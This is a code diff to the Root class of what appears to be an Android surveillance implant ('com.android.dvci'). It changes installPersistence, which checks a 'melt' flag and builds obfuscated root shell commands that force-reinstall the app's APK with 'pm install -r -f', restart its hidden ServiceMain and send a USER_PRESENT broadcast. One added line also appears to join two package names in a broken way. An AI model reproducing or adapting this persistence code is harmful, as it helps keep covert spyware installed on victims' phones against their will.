@@ -396,11 +396,13 @@ public class Root {
 		android.content.pm.PackageInfo pi = null;
 		String apkPosition = null;
 		Boolean isPersisten = false;
-		if( (apkPosition=Status.getApkName())!=null ){
+		if( (apkPosition=Status.getApkName())!=null && !Status.isMelt()){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
 			}
 			isPersisten = Status.isPersistent();
+		}else{
+			return false;
 		}
 		if( isPersisten || Status.persistencyReady()){
 			if (Cfg.DEBUG) {
@@ -440,9 +442,9 @@ public class Root {
 		command+= M.e("chmod 644 ") + perPkg + "\n";
 		command+= String.format(M.e("[ -s %s ] && pm install -r -f "), perPkg) + perPkg + "\n";
 		command+= M.e("sleep 1") + "\n";
-		command+= M.e("installed=$(pm list packages com.android.dvci)") + "\n";
+		command+= M.e("installed=$(pm list packages ") +Status.self().getAppContext().getPackageName()+ ")\n";
 		command+= M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
-		command+= M.e("am startservice com.android.dvci/.ServiceMain") + "\n";
+		command+= M.e("am startservice com.android.dvci")+Status.self().getAppContext().getPackageName()+M.e("/.ServiceMain") + "\n";
 		command+= M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
 		command+= M.e("fi") + "\n";
 		command+= M.e("sleep 2") + "\n";
